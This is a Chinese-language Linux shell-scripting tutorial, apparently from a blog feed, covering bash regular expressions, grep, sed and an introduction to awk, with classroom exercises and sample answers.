+<h4 id="代表以a开头的"><a href="#代表以a开头的" class="headerlink" title="代表以a开头的"></a>代表以a开头的</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">if [[ $1 =~ ^a  ]]</span><br><span class="line">then</span><br><span class="line">        echo ok</span><br><span class="line">else</span><br><span class="line">        echo no</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
+
+<p><strong>测试：</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel6 ~]# bash re.sh a</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh b</span><br><span class="line">no</span><br><span class="line">[root@rhel6 ~]# bash re.sh ab</span><br><span class="line">ok</span><br></pre></td></tr></table></figure>
+<h4 id="代表以a结尾的"><a href="#代表以a结尾的" class="headerlink" title="代表以a结尾的"></a>代表以a结尾的</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">if [[ $1 =~ a$  ]]</span><br><span class="line">then</span><br><span class="line">        echo ok</span><br><span class="line">else</span><br><span class="line">        echo no</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
+<p><strong>测试：</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel6 ~]# vim re.sh</span><br><span class="line">[root@rhel6 ~]# bash re.sh a</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh b</span><br><span class="line">no</span><br><span class="line">[root@rhel6 ~]# bash re.sh ab</span><br><span class="line">no</span><br><span class="line">[root@rhel6 ~]# bash re.sh ba</span><br><span class="line">ok</span><br></pre></td></tr></table></figure>
+
+
+<h4 id="代表a字符后面一定有两个字符"><a href="#代表a字符后面一定有两个字符" class="headerlink" title="代表a字符后面一定有两个字符"></a>代表a字符后面一定有两个字符</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">if [[ $1 =~ a..  ]]</span><br><span class="line">then</span><br><span class="line">	echo ok</span><br><span class="line">else</span><br><span class="line">	echo no</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
+<p><strong>测试：</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel6 ~]# vim re.sh</span><br><span class="line">[root@rhel6 ~]# bash re.sh a</span><br><span class="line">no</span><br><span class="line">[root@rhel6 ~]# bash re.sh axx</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh baxx</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh baxxx</span><br><span class="line">ok</span><br></pre></td></tr></table></figure>
+
+<h4 id="代表匹配a字符后面可以是0个b，也可以是多个b"><a href="#代表匹配a字符后面可以是0个b，也可以是多个b" class="headerlink" title="代表匹配a字符后面可以是0个b，也可以是多个b"></a>代表匹配a字符后面可以是0个b，也可以是多个b</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">if [[ $1 =~ ab*  ]]</span><br><span class="line">then</span><br><span class="line">	echo ok</span><br><span class="line">else</span><br><span class="line">	echo no</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
+<p><strong>测试：</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel6 ~]# bash re.sh a</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh ab</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh abbbb</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh abbbbxxx</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh accc</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh ccc</span><br><span class="line">no</span><br></pre></td></tr></table></figure>
+
+
+<h4 id="匹配-0-个或1个前一字符"><a href="#匹配-0-个或1个前一字符" class="headerlink" title="匹配 0 个或1个前一字符"></a>匹配 0 个或1个前一字符</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">if [[ $1 =~ 1a?1 ]]</span><br><span class="line">then</span><br><span class="line">        echo ok</span><br><span class="line">else</span><br><span class="line">        echo no</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
+<p><strong>测试：</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel6 ~]# bash re.sh 11</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh 1a1</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh 1aa1</span><br><span class="line">no</span><br></pre></td></tr></table></figure>
+
+<h4 id="代表匹配a字符后面可以是1个b，也可以是多个b"><a href="#代表匹配a字符后面可以是1个b，也可以是多个b" class="headerlink" title="代表匹配a字符后面可以是1个b，也可以是多个b"></a>代表匹配a字符后面可以是1个b，也可以是多个b</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">if [[ $1 =~ ab+ ]]</span><br><span class="line">then</span><br><span class="line">	echo ok</span><br><span class="line">else</span><br><span class="line">	echo no</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
+<p><strong>测试：</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel6 ~]# bash re.sh a</span><br><span class="line">no</span><br><span class="line">[root@rhel6 ~]# bash re.sh ab</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh abbb</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh ac</span><br><span class="line">no</span><br></pre></td></tr></table></figure>
+
+
+<h4 id="代表匹配ab字符，后面可以是任意字符"><a href="#代表匹配ab字符，后面可以是任意字符" class="headerlink" title="代表匹配ab字符，后面可以是任意字符"></a>代表匹配ab字符，后面可以是任意字符</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">if [[ $1 =~ ab.*  ]]</span><br><span class="line">then</span><br><span class="line">	echo ok</span><br><span class="line">else</span><br><span class="line">	echo no</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
+<p><strong>测试：</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel6 ~]# vim re.sh</span><br><span class="line">[root@rhel6 ~]# bash re.sh a</span><br><span class="line">no</span><br><span class="line">[root@rhel6 ~]# bash re.sh ab</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh abbbb</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh accc</span><br><span class="line">no</span><br><span class="line">[root@rhel6 ~]# bash re.sh ccc</span><br><span class="line">no</span><br></pre></td></tr></table></figure>
+
+<h4 id="代表匹配a和b字符之间可以是任意字符"><a href="#代表匹配a和b字符之间可以是任意字符" class="headerlink" title="代表匹配a和b字符之间可以是任意字符"></a>代表匹配a和b字符之间可以是任意字符</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">if [[ $1 =~ a.*b  ]]</span><br><span class="line">then</span><br><span class="line">	echo ok</span><br><span class="line">else</span><br><span class="line">	echo no</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
+<p><strong>测试：</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel6 ~]# bash re.sh a</span><br><span class="line">no</span><br><span class="line">[root@rhel6 ~]# bash re.sh b</span><br><span class="line">no</span><br><span class="line">[root@rhel6 ~]# bash re.sh ab</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh a1b</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh 1a1b1</span><br><span class="line">ok</span><br></pre></td></tr></table></figure>
+<h4 id="代表匹配指定字符组内的任一字符，可以用逗号分割，或者不用，效果一样都代表匹配一个字符"><a href="#代表匹配指定字符组内的任一字符，可以用逗号分割，或者不用，效果一样都代表匹配一个字符" class="headerlink" title="代表匹配指定字符组内的任一字符，可以用逗号分割，或者不用，效果一样都代表匹配一个字符"></a>代表匹配指定字符组内的任一字符，可以用逗号分割，或者不用，效果一样都代表匹配一个字符</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">if [[ $1 =~ [Bb]ooboo ]]</span><br><span class="line">then</span><br><span class="line">        echo ok</span><br><span class="line">else</span><br><span class="line">        echo no</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
+<p><strong>测试：</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel6 ~]# bash re.sh booboo</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh Booboo</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh cooboo</span><br><span class="line">no</span><br></pre></td></tr></table></figure>
+
+<h4 id="代表匹配不在指定字符组内的任一字符"><a href="#代表匹配不在指定字符组内的任一字符" class="headerlink" title="代表匹配不在指定字符组内的任一字符"></a>代表匹配不在指定字符组内的任一字符</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">if [[ $1 =~ [^Bb]ooboo ]]</span><br><span class="line">then</span><br><span class="line">        echo ok</span><br><span class="line">else</span><br><span class="line">        echo no</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
+<p><strong>测试：</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel6 ~]# bash re.sh booboo</span><br><span class="line">no</span><br><span class="line">[root@rhel6 ~]# bash re.sh Booboo</span><br><span class="line">no</span><br><span class="line">[root@rhel6 ~]# bash re.sh cooboo</span><br><span class="line">ok</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="单词起始和结束边界匹配符与行首行尾的匹配对比"><a href="#单词起始和结束边界匹配符与行首行尾的匹配对比" class="headerlink" title="单词起始和结束边界匹配符与行首行尾的匹配对比"></a>单词起始和结束边界匹配符与行首行尾的匹配对比</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel6 ~]# vim re.file</span><br><span class="line">booboo	tom	jack</span><br><span class="line">jack	tom	booboo</span><br><span class="line">tom tom	tom</span><br><span class="line">jack</span><br><span class="line"> jack</span><br><span class="line">jack</span><br><span class="line"></span><br><span class="line">[root@rhel6 ~]# grep "^booboo" re.file</span><br><span class="line">booboo	tom	jack</span><br><span class="line">[root@rhel6 ~]# grep "\&lt;booboo" re.file</span><br><span class="line">booboo	tom	jack</span><br><span class="line">jack	tom	booboo</span><br><span class="line">[root@rhel6 ~]# grep "\&gt;booboo" re.file</span><br><span class="line">[root@rhel6 ~]# grep "\&gt;jack" re.file</span><br><span class="line">[root@rhel6 ~]# grep "jack$" re.file</span><br><span class="line">booboo	tom	jack</span><br><span class="line">jack</span><br><span class="line"> jack</span><br><span class="line">jack</span><br><span class="line">[root@rhel6 ~]# grep "jack\&gt;" re.file</span><br><span class="line">booboo	tom	jack</span><br><span class="line">jack	tom	booboo</span><br><span class="line">jack</span><br><span class="line"> jack</span><br><span class="line">jack</span><br></pre></td></tr></table></figure>
+<h4 id="某个字符数量限定"><a href="#某个字符数量限定" class="headerlink" title="某个字符数量限定"></a>某个字符数量限定</h4><ul>
+<li>x{m}连续 M 个字符 X       x{3} =3<ul>
+<li>x{m,} 至少 M 个字符 Xx{3,} &gt;=3</li>
+</ul>
+</li>
+<li>x{m,n} 至少 M 个最多 N 个字符 X x{3,4} &gt;=3 &lt;=4</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel6 ~]# vim re.file</span><br><span class="line">booboo	tom	jack</span><br><span class="line">jack	tom	booboo</span><br><span class="line">tom tom	tom</span><br><span class="line">jack</span><br><span class="line"> jack</span><br><span class="line">jack</span><br><span class="line">f	fo	foo	fooo	foooo</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@rhel6 ~]# grep "o\&#123;0\&#125;" re.file</span><br><span class="line">booboo	tom	jack</span><br><span class="line">jack	tom	booboo</span><br><span class="line">tom tom	tom</span><br><span class="line">jack</span><br><span class="line"> jack</span><br><span class="line">jack</span><br><span class="line">booo</span><br><span class="line">boo</span><br><span class="line">f	fo	foo	fooo	foooo</span><br><span class="line">[root@rhel6 ~]# grep "o\&#123;1\&#125;" re.file</span><br><span class="line">booboo	tom	jack</span><br><span class="line">jack	tom	booboo</span><br><span class="line">tom tom	tom</span><br><span class="line">booo</span><br><span class="line">boo</span><br><span class="line">f	fo	foo	fooo	foooo</span><br><span class="line">[root@rhel6 ~]# grep "o\&#123;4\&#125;" re.file</span><br><span class="line">f	fo	foo	fooo	foooo</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">if [[ $1 =~ o&#123;2,3&#125;$ ]]</span><br><span class="line">then</span><br><span class="line">        echo ok</span><br><span class="line">else</span><br><span class="line">        echo no</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">[root@rhel6 ~]# bash re.sh foo</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh fooo</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh fooof</span><br><span class="line">no</span><br><span class="line">[root@rhel6 ~]# bash re.sh foof</span><br><span class="line">no</span><br></pre></td></tr></table></figure>
+<h4 id="digit-代表数字而已-0-9"><a href="#digit-代表数字而已-0-9" class="headerlink" title="[:digit:]代表数字而已 , 0-9"></a>[:digit:]代表数字而已 , 0-9</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel6 ~]# cat re.file1</span><br><span class="line">45aa</span><br><span class="line">sdfsdf</span><br><span class="line">4444</span><br><span class="line">[root@rhel6 ~]# grep "[[:digit:]]" re.file1</span><br><span class="line">45aa</span><br><span class="line">4444</span><br><span class="line">[root@rhel6 ~]# grep "^[[:digit:]]" re.file1</span><br><span class="line">45aa</span><br><span class="line">4444</span><br><span class="line">[root@rhel6 ~]# grep "[^[:digit:]]" re.file1</span><br><span class="line">45aa</span><br><span class="line">sdfsdf</span><br><span class="line">[root@rhel6 ~]# grep "^[^[:digit:]]" re.file1</span><br><span class="line">sdfsdf</span><br></pre></td></tr></table></figure>
+<h3 id="课堂作业"><a href="#课堂作业" class="headerlink" title="课堂作业"></a>课堂作业</h3><blockquote>
+<p>1.说出下面匹配的内容</p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash">^a 以a开头</span></span><br><span class="line"><span class="meta">#</span><span class="bash">b? b的个数0或者1</span></span><br><span class="line"><span class="meta">#</span><span class="bash">c+ c的个数&gt;=1</span></span><br><span class="line"><span class="meta">#</span><span class="bash">d.*e d和e之间可以是任意字符</span></span><br><span class="line"><span class="meta">#</span><span class="bash">f$ 以f结尾</span></span><br><span class="line">if [[ $1 =~ ^ab?c+d.*ef$ ]]</span><br><span class="line">then</span><br><span class="line">        echo ok</span><br><span class="line">else</span><br><span class="line">        echo no</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
+
+<h3 id="课后作业"><a href="#课后作业" class="headerlink" title="课后作业"></a>课后作业</h3><blockquote>
+<p>1.if判断匹配ip地址</p>
+</blockquote>
+<blockquote>
+<p>2.if判断匹配邮件地址格式为<a href="mailto:9aA@9aA.com">9aA@9aA.com</a></p>
+</blockquote>
+<blockquote>
+<p>3.grep 过滤空白行</p>
+</blockquote>
+<blockquote>
+<p>4.grep 过滤以空格开头的行</p>
+</blockquote>
+<blockquote>
+<p>5.针对/usr/share/dict/words文件做过滤</p>
+</blockquote>
+<blockquote>
+<p> 1）列出文件中包含 先有字母t，然后中间有一个元音字母，之后是sh的单词；</p>
+</blockquote>
+<blockquote>
+<p> 2）列出文件中包含 先有字母t，然后中间有若干个元音字母，之后是sh的单词；</p>
+</blockquote>
+<blockquote>
+<p> 3）列出文件中刚好包含16个字母的单词。**</p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">if [[ $1 =~ ^[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;$ ]]</span><br><span class="line">then</span><br><span class="line">	IP=($&#123;1//\./ &#125;)</span><br><span class="line">	[ $&#123;IP[0]&#125; -gt 0 -a $&#123;IP[0]&#125; -lt 255 ] &amp;&amp; [ $&#123;IP[1]&#125; -ge 0 -a $&#123;IP[1]&#125; -lt 255 ] &amp;&amp; [ $&#123;IP[2]&#125; -ge 0 -a $&#123;IP[2]&#125; -lt 255 ] &amp;&amp; [ $&#123;IP[3]&#125; -gt 0 -a $&#123;IP[3]&#125; -lt 255 ] &amp;&amp; echo ok || echo no</span><br><span class="line"></span><br><span class="line">else</span><br><span class="line">        echo "this is not IPADDR!"</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">if [[ $1 =~ ^[0-9a-zA-Z]+@[0-9a-zA-Z]+\.com$  ]]</span><br><span class="line">then</span><br><span class="line">	echo ok</span><br><span class="line">else</span><br><span class="line">	echo no</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@rhel6 ~]# grep "^$" re.file2</span><br><span class="line"></span><br><span class="line">grep '^t[a-zA-Z]sh' /usr/share/dict/words</span><br><span class="line">grep '^t[a-zA-Z]\+sh' /usr/share/dict/words</span><br><span class="line">grep -E '^[a-zA-Z0-9]&#123;16&#125;$' /usr/share/dict/words                         </span><br><span class="line">grep '^[a-zA-Z0-9]\&#123;16\&#125;$' /usr/share/dict/words</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="晚自习作业"><a href="#晚自习作业" class="headerlink" title="晚自习作业"></a>晚自习作业</h3><ol>
+<li>完成所有练习</li>
+<li>帐号是否合法（字母开头，允许5-16位，只能包含字母数字下划线）</li>
+<li>密码是否合法（字母开头，允许6-18位，只能包含字母数字下划线和！@#）</li>
+<li>匹配日期2016-10-11<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="keyword">if</span> [[ <span class="variable">$1</span> =~ ^[0-9]&#123;4&#125;-[0-9]&#123;2&#125;-[0-9]&#123;2&#125;$ ]]</span></span><br><span class="line">if [[ $1 =~ ^[0-9]&#123;4&#125;-(0[1-9]|1[0-2])-(0[1-9]|1[0-9]|2[1-9]|3[01])$ ]]</span><br><span class="line">then</span><br><span class="line">	echo ok</span><br><span class="line">else</span><br><span class="line">	echo no</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>技术培训</category>
+        <category>LinuxBash脚本教程</category>
+      </categories>
+      <tags>
+        <tag>培训</tag>
+        <tag>LinuxBash脚本</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>LINUX Shell Scripts 第四课 Sed</title>
+    <url>/2016/12/23/booboo_bash_shell_scripts/03_shell_sed_awk/</url>
+    <content><![CDATA[<h2 id="sed"><a href="#sed" class="headerlink" title="sed"></a>sed</h2><h3 id="什么是sed"><a href="#什么是sed" class="headerlink" title="什么是sed"></a>什么是sed</h3><p>sed( 意为流编辑器 , 源自英语 “ stream editor” 的缩写 ) 是 Unix 常见的命令行程序。 sed 用来把文档或字符串里面的文字经过一系列编辑命令转换为另一种格式输出。 sed 通常 用来匹配一个或多个正则表达式的文本进行处理。 分号 (;) 可以用作分隔命令的指示符。尽管 sed 脚本固有的很多限制 , 一连串的 sed 指令加起来可以编程像 仓 库番、快打砖块、甚至俄罗斯方块等电脑游戏的复杂程序。</p>
+<h3 id="如何使用sed"><a href="#如何使用sed" class="headerlink" title="如何使用sed"></a>如何使用sed</h3><h4 id="语法模式"><a href="#语法模式" class="headerlink" title="语法模式"></a>语法模式</h4><p>• 命令行模式<br>• 脚本模式</p>
+<p>命令行模式</p>
+<p>sed 流编辑器 针对行进行操作的</p>
+<h4 id="sed命令的原理"><a href="#sed命令的原理" class="headerlink" title="sed命令的原理"></a>sed命令的原理</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">读文件---一行一行读</span><br><span class="line">存入缓存空间</span><br><span class="line">匹配行---是---动作--继续读取</span><br><span class="line">     ---不是------ 继续读取    </span><br><span class="line">读到最后一行为止</span><br><span class="line">输出</span><br></pre></td></tr></table></figure>
+
+<h4 id="sed命令的用法"><a href="#sed命令的用法" class="headerlink" title="sed命令的用法"></a>sed命令的用法</h4><ul>
+<li>sed [-options] ‘[cmd]’ filename</li>
+<li>sed [-options] ‘[哪些行][干什么]’ filename</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cmd</span><br><span class="line">    操作定位（哪一行）</span><br><span class="line">        1    第一行</span><br><span class="line">        2,3    从第二行到第三行</span><br><span class="line">        $    最后一行</span><br><span class="line">        正则表达式</span><br><span class="line">        /^root/    以root开头的行</span><br><span class="line">        /bin$/    以bin结尾的行</span><br><span class="line"></span><br><span class="line">        1. 十进制数字</span><br><span class="line">        2. 正则表达式</span><br><span class="line">        3. 逗号分隔符</span><br><span class="line">        4. 组合方式</span><br><span class="line">        5. 特殊方式</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    函数（干什么）</span><br><span class="line">        p    打印，输出到屏幕上</span><br><span class="line">        d    删除</span><br><span class="line">        s    替换                   sed '/^#/s/\/\*.*\*\///' file  </span><br><span class="line">        a    当前行的行后，添加一行    sed '1ahello word' file</span><br><span class="line">        i    当前行的行前，添加一行    sed '1ihello word' file</span><br><span class="line">参数options</span><br><span class="line">    -n 不输出所有的行</span><br><span class="line">    -i 直接修改目标文件</span><br><span class="line">    -e 连接多个cmd</span><br><span class="line"></span><br><span class="line">简单控制流</span><br><span class="line"></span><br><span class="line">1. ! 命令取反</span><br><span class="line">    例如:sed '/kevin/!d' file</span><br><span class="line">    删除不包含字符串”kevin“的行</span><br><span class="line">2. &#123; &#125; 组合多个命令</span><br><span class="line">组合命令作为一个整体被执行,函数命令之间用” ;  “分隔,组合命令可以嵌套。</span><br><span class="line">例如:sed '/kevin/&#123;s/1/2/; /3/d&#125;' file。</span><br><span class="line"></span><br><span class="line">3. n 读取下一输入行,从下一条命令而非第一条命令开始操作</span><br><span class="line">例如:sed '/kevin/&#123;n; d&#125;' file</span><br><span class="line">删除带字符串”kevin“行的下一行</span><br></pre></td></tr></table></figure>
+
+<h4 id="课堂练习"><a href="#课堂练习" class="headerlink" title="课堂练习"></a>课堂练习</h4><ol>
+<li>下载mysqlbinlog.row文件</li>
+<li>打印第三行</li>
+<li>打印1到5行</li>
+<li>打印最后一行</li>
+<li>打印30到最后一行</li>
+<li>打印包含“BEGIN”的行</li>
+<li>打印包含“COMMIT”的行</li>
+<li>打印以“###”开头的行</li>
+<li>删除每一行的“### ”</li>
+<li>删除所有“/<em>到</em>/”</li>
+<li>将“DELETE FROM”替换为“insert into”</li>
+<li>将“INSERT INTO”替换为“delete from”</li>
+<li>将“SET”替换为“where”</li>
+<li>将“WHERE”替换为“set”</li>
+<li>将“@1”替换为“id”</li>
+<li>将“@2”替换为“name”</li>
+</ol>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@client0 ~]# sed '3p' mysqlbinlog.row</span><br><span class="line">[root@client0 ~]# sed -n '3p' mysqlbinlog.row</span><br><span class="line">[root@client0 ~]# sed -n '1,5p' mysqlbinlog.row</span><br><span class="line">[root@client0 ~]# sed -n '$p' mysqlbinlog.row</span><br><span class="line">[root@client0 ~]# sed -n '30,$p' mysqlbinlog.row</span><br><span class="line">[root@client0 ~]# sed -n '/BEGIN/p' mysqlbinlog.row</span><br><span class="line">[root@client0 ~]# sed -n '/COMMIT/p' mysqlbinlog.row</span><br><span class="line">[root@client0 ~]# sed '&#123;s/### //;s@\/\*.*\*\/@@;s/DELETE FROM/insert into/;s/INSERT INTO/delete from/;s/SET/where/;s/WHERE/set/;s/@1/id/;s/@2/name/&#125;' mysqlbinlog.row</span><br></pre></td></tr></table></figure>
+
+<h4 id="课堂练习-1"><a href="#课堂练习-1" class="headerlink" title="课堂练习"></a>课堂练习</h4><ol>
+<li>将192.168.1.1替换成192.168.2.2</li>
+<li>将192.168.1.1替换成192.188.5.1</li>
+<li>将192.168.1.1替换成192.192.192.1</li>
+<li>将hello,babay中babay后面追加”,mybabay”</li>
+<li>将hello,babay中hello后面追加”,mybabay”</li>
+<li>将hello,babay替换为”hello1hello2hello3,babay”</li>
+<li>将/tmp/shadow的内容追加到/tmp/passwd中以root开头的行的后面</li>
+<li>将/tmp/passwd中以root开头的行和后面的2行写入/tmp/shadow</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@client0 ~]<span class="comment"># echo 192.168.1.1|sed 's/\(.*\)1.1/\12.2/'</span></span><br><span class="line">192.168.2.2</span><br><span class="line">[root@client0 ~]<span class="comment"># echo 192.168.1.1|sed 's/\(.*\)168.1\(.*\)/\1188.5\2/'</span></span><br><span class="line">192.188.5.1</span><br><span class="line">[root@client0 ~]<span class="comment"># echo 192.168.1.1|sed 's/\(.*\)168.1\(.*\)/\1\1\11/'</span></span><br><span class="line">192.192.192.1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@client0 ~]<span class="comment"># echo hello,babay|sed 's/babay/&amp;,mybabay/'</span></span><br><span class="line">hello,babay,mybabay</span><br><span class="line">[root@client0 ~]<span class="comment"># echo hello,babay|sed 's/hello/&amp;,mybabay/'</span></span><br><span class="line">hello,mybabay,babay</span><br><span class="line">[root@client0 ~]<span class="comment"># echo hello,babay|sed 's/hello/&amp;1&amp;2&amp;3/'</span></span><br><span class="line">hello1hello2hello3,babay</span><br><span class="line"></span><br><span class="line">[root@client0 ~]<span class="comment"># sed '/^root/r /tmp/shadow' /tmp/passwd</span></span><br><span class="line">[root@client0 ~]<span class="comment"># sed '/^root/,+2w /tmp/shadow' /tmp/passwd</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="课后习题"><a href="#课后习题" class="headerlink" title="课后习题"></a>课后习题</h4><pre><code>1. 将selinux设置成开机关闭状态。用sed完成
+2. 设置当前用户的umask值永久生效为033 ~/.bashrc。用sed完成
+3. 用脚本实现自动化搭建DNS服务器，并自动化配置解析，自动化测试。</code></pre><h2 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>awk是一个强大的文本分析工具，相对于grep的查找，sed的编辑，awk在其对数据分析并生成报告时，显得尤为强大。简单来说awk就是把文件逐行的读入，以空格为默认分隔符将每行切片，切开的部分再进行各种分析处理。</p>
+<p>awk有3个不同版本: awk、nawk和gawk，未作特别说明，一般指gawk，gawk 是 AWK 的 GNU 版本。</p>
+<p>awk其名称得自于它的创始人 Alfred Aho 、Peter Weinberger 和 Brian Kernighan 姓氏的首个字母。实际上 AWK 的确拥有自己的语言： AWK 程序设计语言 ， 三位创建者已将它正式定义为“样式扫描和处理语言”。它允许您创建简短的程序，这些程序读取输入文件、为数据排序、处理数据、对输入执行计算以及生成报表，还有无数其他的功能。</p>
+<h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p>awk ‘{pattern + action}’ {filenames}</p>
+<p>尽管操作可能会很复杂，但语法总是这样，其中 pattern 表示 AWK 在数据中查找的内容，而 action 是在找到匹配内容时所执行的一系列命令。花括号（{}）不需要在程序中始终出现，但它们用于根据特定的模式对一系列指令进行分组。 pattern就是要表示的正则表达式，用斜杠括起来。</p>
+<p>awk语言的最基本功能是在文件或者字符串中基于指定规则浏览和抽取信息，awk抽取信息后，才能进行其他文本操作。完整的awk脚本通常用来格式化文本文件中的信息。</p>
+<p>通常，awk是以文件的一行为处理单位的。awk每接收文件的一行，然后执行相应的命令，来处理文本。</p>
+<h3 id="调用awk"><a href="#调用awk" class="headerlink" title="调用awk"></a>调用awk</h3><p>有三种方式调用awk</p>
+<ol>
+<li>命令行方式<br>awk [-F  field-separator]  ‘commands’  input-file(s)</li>
+</ol>
+<p>其中，commands 是真正awk命令，[-F域分隔符]是可选的。 input-file(s) 是待处理的文件。</p>
+<p>在awk中，文件的每一行中，由域分隔符分开的每一项称为一个域。通常，在不指名-F域分隔符的情况下，默认的域分隔符是空格。</p>
+<ol start="2">
+<li>shell脚本方式</li>
+</ol>
+<p>将所有的awk命令插入一个文件，并使awk程序可执行，然后awk命令解释器作为脚本的首行，一遍通过键入脚本名称来调用。</p>
+<p>相当于shell脚本首行的：#!/bin/sh</p>
+<p>可以换成：#!/bin/awk</p>
+<ol start="3">
+<li>将所有的awk命令插入一个单独文件，然后调用：<br>awk -f awk-script-file input-file(s)</li>
+</ol>
+<p>其中，-f选项加载awk-script-file中的awk脚本，input-file(s)跟上面的是一样的。</p>
+<p>本章重点介绍命令行方式。</p>
+<h3 id="入门实例"><a href="#入门实例" class="headerlink" title="入门实例"></a>入门实例</h3><p>假设last -n 5的输出如下</p>
